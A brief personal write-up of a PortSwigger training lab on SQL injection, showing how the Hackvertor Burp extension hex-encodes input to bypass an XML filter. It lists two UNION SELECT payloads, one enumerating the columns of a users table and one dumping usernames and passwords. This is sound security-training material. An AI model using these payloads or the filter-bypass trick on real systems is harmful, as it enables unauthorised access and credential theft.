### [SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
Level: Practitioner\
Date completed: 2026-05-20

Download Hackvertor extension through Burp: Extensions > BApp Store > Search for Hackvertor > Install. Then you can highlight the storeId value (just a 1 in my case) and obfuscate it by right clicking and going to Extensions > Hackvertor > Encode > hex_entities.

Here's what I injected, obfuscated via Hackvertor:
1. `2 UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users'--` --> Shows the fields email, password, and username.
2. `2 UNION SELECT username || password FROM users--` --> Shows all usernames and passwords.